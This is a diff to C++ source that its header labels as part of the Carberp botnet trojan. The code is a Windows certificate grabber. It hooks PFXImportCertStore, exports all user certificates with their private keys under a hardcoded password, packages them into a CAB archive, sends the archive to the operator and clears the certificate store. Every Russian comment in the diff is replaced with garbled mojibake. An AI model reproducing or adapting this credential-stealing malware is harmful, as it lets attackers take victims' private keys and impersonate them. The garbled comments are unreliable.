@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 //---------------------------------------------------------------------------
 #include <windows.h>
 #include <shlobj.h>
@@ -17,7 +28,7 @@
 const static char CerdStoreName[]      = {'M', 'y', 0};
 const static WCHAR CerdStorePassword[] = {'e', 'q', 'r', 'v', 'n', 'i', '3', '7', 'd', 's',  0};
 
-// Объявляем типы для перехвата функций
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 typedef HCERTSTORE (WINAPI * PPFXImportCertStore)(CRYPT_DATA_BLOB* pPFX, LPCWSTR szPassword, DWORD dwFlags);
 
 PPFXImportCertStore Real_PFXImportCertStore;
@@ -30,7 +41,7 @@ HCERTSTORE WINAPI Hook_PFXImportCertStore(CRYPT_DATA_BLOB *data, LPCWSTR passwor
 	HCERTSTORE certstore = Real_PFXImportCertStore(data, password, flags);
 	if(certstore != NULL && (flags & 0x10000000) == 0 && data && data->cbData > 0 && data->pbData != NULL)
 	{
-		// Отправляем сертификат
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		TCertData Data;
 		ClearStruct(Data);
 
@@ -48,7 +59,7 @@ HCERTSTORE WINAPI Hook_PFXImportCertStore(CRYPT_DATA_BLOB *data, LPCWSTR passwor
 
 bool HookCertGrabberApi()
 {
-	// Перехватываем функции импортирования сертификатов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	const DWORD Hash_PFXImportCertStore = 0x3A1B7F5D;
 	if(HookApi(DLL_CRYPT32, Hash_PFXImportCertStore, &Hook_PFXImportCertStore) )
 	{
@@ -72,13 +83,13 @@ void ClearCertData(PCertData Data)
 
 PCHAR GetSignalFileName()
 {
-	// Функция возвращает имя сигнального файла.
-	// Существование такого файла в системе говорит нам о том,
-	// что мы уже удалили неэкспортируемые сертификаты
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ,
+	// пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	const static char FName[] = {'i', 'e', 'u', 'n', 'i', 't', 'd', 'r', 'f', '.', 'i', 'n', 'f',  0};
 
 
-	 // Функция возвращает путь к директории хранения данных приложений
+	 // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PCHAR Path = STR::Alloc(MAX_PATH);
 	if (Path == NULL) return NULL;
 
@@ -95,12 +106,12 @@ PCHAR GetSignalFileName()
 //-----------------------------------------------------------------------------
 void CertGrabber::Initialize()
 {
-	// При первом запуске системы мы экспортируем все сертификаты,
-	// очищаем хранилище и импортируем полученные сертификаты обратно
-	// в хранилище.
-	// Это приведёт к тому, что в хранилище останутся только
-	// экспортируемые сертификаты т.к. при экспорте Неэкспортируемые
-	// сертификаты не будут экспортироваться
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ,
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ.пїЅ. пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	
 
@@ -108,7 +119,7 @@ void CertGrabber::Initialize()
 	
 	if (!FileExistsA(File))
 	{
-		// Первый запуск на этой системе
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		
 
 		TCertData Data;
@@ -117,31 +128,31 @@ void CertGrabber::Initialize()
 		Data.Name     = (PCHAR)CerdStoreName;
 		Data.Password = (PWCHAR)CerdStorePassword;
 
-		// Экспортируем
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		Export(&Data);
 
 		
-		// Отправляем сертификаты
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		SendCert(&Data);
 
 
-		// Очищаем хранилище
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		ClearCertStore(Data.Name);
 
 
-		// Восстанавливаем экспортированные сертификаты
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		Import(&Data);
 
-		// Освоюождаем память
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		ClearCertData(&Data);
 
-		// Создаём сигнальный файл
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		File::WriteBufferA(File, NULL, 0);
     }
 
 	STR::Free(File);
 
-	// Перехватываем нужные апи
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 	HookCertGrabberApi();
 
 }
@@ -151,14 +162,14 @@ void CertGrabber::Initialize()
 
 bool CertGrabber::Export(PCertData Data)
 {
-	// Экспортируем все зарегистрированные сертификаты
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Data == NULL) return false;
 
 	bool Result = false;
 	HANDLE Store = pCertOpenSystemStoreA( NULL, Data->Name );
 	if (Store == NULL) return false;
 
-	// Определяем количество сертификатов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	Data->Count = 0;
 	PCCERT_CONTEXT CertContext = 0;
 	while((CertContext = (PCCERT_CONTEXT)pCertEnumCertificatesInStore(Store, CertContext)) != NULL)
@@ -166,7 +177,7 @@ bool CertGrabber::Export(PCertData Data)
 
 	if (Data->Count > 0 )
 	{
-		//Получаем размер хранилища.
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		Data->Blob.pbData = NULL;
 		Data->Blob.cbData = 0;
 		if (pPFXExportCertStoreEx(Store, &Data->Blob, Data->Password, 0, EXPORT_PRIVATE_KEYS) != FALSE)
@@ -186,7 +197,7 @@ bool CertGrabber::Export(PCertData Data)
 
 void CertGrabber::ClearCertStore(PCHAR Name)
 {
-	// Очистить хранилище сертификатов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	HANDLE Store = pCertOpenSystemStoreA(NULL, Name);
 	if( Store == NULL) return;
@@ -205,7 +216,7 @@ void CertGrabber::ClearCertStore(PCHAR Name)
 
 bool CertGrabber::Import(PCertData Data)
 {
-	// Импортировать сертификаты в хранилище
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Data == NULL || Data->Blob.pbData == NULL)
 		return false;
 
@@ -231,7 +242,7 @@ bool CertGrabber::Import(PCertData Data)
 
 bool CertGrabber::SendCert(PCertData Data)
 {
-	// Отправить сертификаты
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	const static char AppName[]  = {'c', 'e', 'r', 't',  0};
 	const static char CertFile[] = {'c', 'e', 'r', 't', '.', 'p', 'f', 'x',  0};
 	const static char PassFile[] = {'P', 'a', 's', 's', '.', 't', 'x', 't',  0};
@@ -246,7 +257,7 @@ bool CertGrabber::SendCert(PCertData Data)
 	HCAB Cab = CreateCab(FileName);
 	if (Cab != NULL)
 	{
-		// Добавляем данные в архив
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 		PCHAR Pass = WSTR::ToAnsi(Data->Password, 0);
 
 		AddBlobToCab(Cab, Data->Blob.pbData, Data->Blob.cbData, (PCHAR)CertFile);
@@ -254,14 +265,14 @@ bool CertGrabber::SendCert(PCertData Data)
 
 		STR::Free(Pass);
 
-		// Закрываем архив
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		CloseCab(Cab);
 
-		// Отправляем каб
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 		Result = DataGrabber::SendCabDelayed(NULL, FileName, (PCHAR)AppName);
 	}
 
-	// Удаляем архив
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	pDeleteFileA(FileName);
 
 	STR::Free(FileName);
